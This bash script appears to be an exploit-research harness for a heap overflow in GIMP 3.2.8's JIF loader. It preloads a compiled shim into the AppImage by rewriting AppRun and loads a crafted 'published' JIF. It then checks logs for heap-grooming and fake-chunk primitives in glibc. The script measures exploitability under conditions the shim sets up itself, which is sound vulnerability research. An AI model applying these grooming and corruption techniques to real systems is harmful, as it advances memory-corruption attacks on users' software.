#!/usr/bin/env bash
# Live-process post-pin consumer probe: preload consumer-shim.c (raw and
# patched modes) into the SHA-verified GIMP 3.2.8 AppImage, feed the safe
# JIF and the published wrapped JIF through gimp-file-load, and measure
# whether the shim-groomed 0x110 smallbin pair is consumed after the pin.
# The shim arranges the pair; this is NOT a natural plugin neighbour.
set -uo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
BASE="$(cd "$HERE/.." && pwd)"
WORK="${GIMPJIF_APPIMAGE_WORK:-/tmp/gimpjif-appimage}"
ROOT="$WORK/squashfs-root"
EVID="$HERE/evidence"
PASS=0
FAIL=0

ok () { echo "PASS: $1"; PASS=$((PASS + 1)); }
no () { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

mkdir -p "$EVID"
[ -x "$ROOT/AppRun" ] || { echo "extracted AppImage missing" >&2; exit 1; }
"$ROOT/AppRun" --version | grep -q '3.2.8' \
  && ok "extracted runtime reports GIMP 3.2.8" || no "runtime version"

gcc -shared -fPIC -O2 -o "$HERE/consumer-raw.so" "$HERE/consumer-shim.c" -ldl \
  && ok "raw consumer shim built" || no "raw consumer shim build"
gcc -shared -fPIC -O2 -DPATCH_MODE -o "$HERE/consumer-patch.so" \
  "$HERE/consumer-shim.c" -ldl \
  && ok "patched consumer shim built" || no "patched consumer shim build"

swap_preload () {
  local shim="$1" line ins=0 out="$ROOT/AppRun.new"
  : > "$out"
  while IFS= read -r line || [ -n "$line" ]; do
    case "$line" in
      *inflate-shim.so*|*patch-shim.so*|*consumer-raw.so*|*consumer-patch.so*)
        continue ;;
      exec*org.gimp.GIMP.Stable*)
        if [ "$ins" -eq 0 ]; then
          printf 'export LD_PRELOAD="$LD_PRELOAD:%s"\n' "$shim" >> "$out"
          ins=1
        fi ;;
    esac
    printf '%s\n' "$line" >> "$out"
  done < "$ROOT/AppRun"
  [ "$ins" -eq 1 ] || { echo "AppRun exec line not found" >&2; return 1; }
  mv "$out" "$ROOT/AppRun"
  chmod +x "$ROOT/AppRun"
}

run_jif () {
  local tag="$1" jif="$2" shim="$3" out="$EVID/appimage-consumer-$4.log"
  local home rc=0
  swap_preload "$shim" || return 1
  home="$(mktemp -d /tmp/gimpjif-consumerhome-XXXXXX)"
  (cd "$ROOT" && exec setsid timeout -k 5 90 env HOME="$home" ./AppRun -i \
      --batch-interpreter plug-in-script-fu-eval \
      -b "(let* ((img (car (gimp-file-load RUN-NONINTERACTIVE \"$jif\" \"$(basename "$jif")\")))) (gimp-message (number->string (car (gimp-image-get-width img)))))" \
      -b '(gimp-quit 0)') > "$out" 2>&1 &
  runpid=$!
  wait "$runpid" || rc=$?
  echo "RUN_RC=$rc" >> "$out"
  # The plug-in and script-fu children outlive the main AppRun; kill their
  # whole session so none holds the wake cgroup. Scoped to this run only.
  kill -9 -- "-$runpid" 2>/dev/null || true
}

SAFE="$BASE/realglib/evidence/safe.jif"
PUB="$BASE/realglib/evidence/published.jif"
run_jif safe "$SAFE" "$HERE/consumer-raw.so" safe
run_jif raw "$PUB" "$HERE/consumer-raw.so" raw
run_jif patch "$PUB" "$HERE/consumer-patch.so" patch
# Leave the canonical observation shim installed for the other runners.
swap_preload "$HERE/inflate-shim.so" || true

S="$EVID/appimage-consumer-safe.log"
R="$EVID/appimage-consumer-raw.log"
P="$EVID/appimage-consumer-patch.log"

grep -q 'batch command executed successfully' "$S" \
  && ok "safe JIF completes the PDB load" || no "safe PDB load"
! grep -q '^SHIM_' "$S" && ok "safe JIF does not arm the consumer" \
  || no "safe consumer control"

grep -q '^SHIM_GROOM_ADJ=1 ' "$R" \
  && ok "raw: shim groomed an adjacent smallbin pair in the live plugin" \
  || no "raw groom adjacency"
grep -q '^SHIM_BYTES=4d4d4d4d4d4d4d4d' "$R" \
  && ok "raw: real zlib wrote chosen 0x4d metadata past 260 bytes" \
  || no "raw chosen metadata"
grep -q '^SHIM_MODE=raw ' "$R" && ok "raw: no post-inflate patch" \
  || no "raw mode"

grep -q '^SHIM_MODE=patch ' "$P" \
  && ok "patched: live pointer words written after decompression" \
  || no "patched mode"
grep -q '^SHIM_POST_PIN .*match_fake=1' "$P" \
  && ok "patched: glibc returned the labelled fake chunk in the live process" \
  || echo "UNKNOWN: no labelled fake-chunk return observed"
BEFORE=$(grep '^SHIM_FAKE_BEFORE=' "$P" | head -1 | cut -d= -f2)
AFTER=$(grep '^SHIM_FAKE_AFTER=' "$P" | head -1 | cut -d= -f2)
if [ -n "$BEFORE" ] && [ -n "$AFTER" ]; then
  [ "$BEFORE" != "$AFTER" ] \
    && ok "patched: glibc rewrote the fake-chunk word in the live process" \
    || echo "UNKNOWN: fake word unchanged in the observed run"
fi

echo "TOTAL: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
